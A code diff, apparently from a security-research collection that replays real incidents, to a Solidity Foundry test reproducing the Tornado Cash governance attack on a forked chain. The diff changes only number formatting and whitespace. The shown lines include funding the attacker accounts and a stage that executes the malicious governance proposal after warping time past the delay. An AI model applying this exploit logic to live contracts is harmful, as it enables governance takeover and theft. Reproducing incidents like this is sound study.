@@ -29,7 +29,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
     Proposal_20 proposal_20;
 
     function setUp() external {
-        forkIdBefore = cheat.createSelectFork(vm.envString("RPC_URL"), 17248593);
+        forkIdBefore = cheat.createSelectFork(vm.envString("RPC_URL"), 17_248_593);
 
         // The attacker used two accounts
         cheat.deal(ATTACKER1, 0.5 ether);
@@ -127,11 +127,11 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         console2.log("Proposal: %s", address(transientContract).code.length);
 
         console2.log("\n======== STAGE 5. EXECUTE MALICIOUS PROPOSAL ========");
-        
+
         console2.log("Executing malicious proposal...");
         (,,, endTime,,,,) = TORNADO_GOVERNANCE.proposals(proposalId);
-        uint256 EXECUTION_DELAY = 172800;
-        vm.warp(endTime + EXECUTION_DELAY+ 1);
+        uint256 EXECUTION_DELAY = 172_800;
+        vm.warp(endTime + EXECUTION_DELAY + 1);
         // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
         // mentioned in the proposal #20 description)
         // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3
